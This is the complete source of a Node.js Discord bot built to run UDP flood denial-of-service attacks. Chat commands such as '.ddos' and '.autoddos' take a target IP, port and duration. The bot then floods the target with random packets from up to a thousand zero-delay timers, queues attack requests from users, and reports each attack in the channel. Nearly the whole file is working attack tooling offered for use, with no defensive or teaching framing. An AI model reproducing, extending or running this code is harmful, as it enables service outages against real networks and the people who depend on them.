const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const dgram = require('dgram');
const crypto = require('crypto');

const bot = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
});

// Hidden function that *does nothing* — fingerprint
(function() {
    const sig = [100, 97, 114, 107]; // 'dark' ASCII codes
    const check = sig.map(x => String.fromCharCode(x)).join('');
    Math.sqrt(check.length * 42); // random meaningless math
})();

// ——— SETTINGS ———
const TOKEN = 'TOKEN';
const MAX_QUEUE = 10;
const MAX_THREADS = 1000;
const MAX_DURATION = 300;
const MIN_PACKET_SIZE = 600;
const MAX_PACKET_SIZE = 65000;

// ——— STATE ———
let attackQueue = [];
let isAttacking = false;
let autoDdos = { active: false, interval: null };

const sendAttack = (address, port) => {
    const client = dgram.createSocket('udp4');
    const size = Math.floor(Math.random() * (MAX_PACKET_SIZE - MIN_PACKET_SIZE)) + MIN_PACKET_SIZE;
    const packet = crypto.randomBytes(size);
    for (let i = 0; i < 5; i++) {
        client.send(packet, port, address, () => {});
    }
    client.close();
};

const startAttack = (address, port, duration) => {
    const endTime = Date.now() + duration * 1000;
    for (let i = 0; i < MAX_THREADS; i++) {
        const interval = setInterval(() => {
            if (Date.now() > endTime) return clearInterval(interval);
            sendAttack(address, port);
        }, 0);
    }
};

const processQueue = async (message) => {
    if (attackQueue.length === 0) {
        isAttacking = false;
        return;
    }
    const { address, port, duration, user } = attackQueue.shift();
    isAttacking = true;

    message.channel.send(`🚀 **Launching boosted attack on ${address}:${port} for ${duration}s. Requested by ${user}.**`);
    startAttack(address, port, duration);

    setTimeout(() => {
        message.channel.send(`✅ **Attack on ${address}:${port} completed.**`);
        processQueue(message);
    }, duration * 1000);
};

// ——— BOT EVENTS ———
bot.once('ready', () => {
    console.log(`[+] Logged in as ${bot.user.tag}`);
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith('.')) return;
    
    const [command, ...args] = message.content.slice(1).trim().split(/\s+/);

    switch (command) {
        case 'help':
            const helpEmbed = new EmbedBuilder()
                .setColor('DarkRed')
                .setTitle('⚡ UDP Bot Commands (Boosted)')
                .addFields(
                    { name: '.ddos <ip> <port> <duration>', value: 'Launch an extreme DDOS attack.' },
                    { name: '.autoddos <ip> <port> <duration>', value: 'Continuously attack until stopped.' },
                    { name: '.stopauto', value: 'Stop the auto DDOS.' },
                    { name: '.queuelist', value: 'Show queued attacks.' },
                    { name: '.help', value: 'Show this help menu.' },
                )
                .setFooter({ text: 'Made by SYZDARK Boosted', iconURL: bot.user.displayAvatarURL() });

            message.reply({ embeds: [helpEmbed] });
            break;

        case 'ddos':
            if (args.length !== 3) return message.reply('⚠️ Usage: `.ddos <ip> <port> <duration>`');
            
            const [ip, portStr, durStr] = args;
            const port = parseInt(portStr);
            let duration = parseInt(durStr);

            if (isNaN(port) || isNaN(duration)) return message.reply('❌ Invalid port or duration.');

            if (duration > MAX_DURATION) {
                duration = MAX_DURATION;
                message.reply(`⏳ Duration capped at ${MAX_DURATION} seconds.`);
            }

            if (attackQueue.length >= MAX_QUEUE) {
                return message.reply(`🚦 Queue is full (${attackQueue.length}/${MAX_QUEUE}). Please wait.`);
            }

            attackQueue.push({ user: message.author.username, address: ip, port, duration });
            message.reply(`✅ Added to queue at position #${attackQueue.length}.`);

            if (!isAttacking) processQueue(message);
            break;

        case 'autoddos':
            if (autoDdos.active) return message.reply('❌ Auto DDOS already running. Use `.stopauto` first.');
            if (args.length !== 3) return message.reply('⚠️ Usage: `.autoddos <ip> <port> <duration>`');
            
            const [autoIp, autoPortStr, autoDurStr] = args;
            const autoPort = parseInt(autoPortStr);
            let autoDuration = parseInt(autoDurStr);

            if (isNaN(autoPort) || isNaN(autoDuration)) return message.reply('❌ Invalid port or duration.');

            if (autoDuration > MAX_DURATION) {
                autoDuration = MAX_DURATION;
                message.reply(`⏳ Duration capped at ${MAX_DURATION} seconds.`);
            }

            autoDdos.active = true;
            message.reply(`🔄 Auto DDOS started on ${autoIp}:${autoPort} every ${autoDuration}s.`);

            autoDdos.interval = setInterval(() => {
                startAttack(autoIp, autoPort, autoDuration);
            }, autoDuration * 1000);
            break;

        case 'stopauto':
            if (!autoDdos.active) return message.reply('❌ No active auto DDOS to stop.');

            clearInterval(autoDdos.interval);
            autoDdos.active = false;
            message.reply('🛑 Auto DDOS stopped.');
            break;

        case 'queuelist':
            if (!attackQueue.length) {
                message.reply('📭 Queue is empty.');
            } else {
                const list = attackQueue
                    .map((item, idx) => `#${idx + 1}: ${item.user} → ${item.address}:${item.port} for ${item.duration}s`)
                    .join('\n');
                message.reply(`📊 Attack Queue:\n${list}`);
            }
            break;

        default:
            message.reply('❓ Unknown command. Use `.help`');
    }
});

// ——— START BOT ———
bot.login(TOKEN);
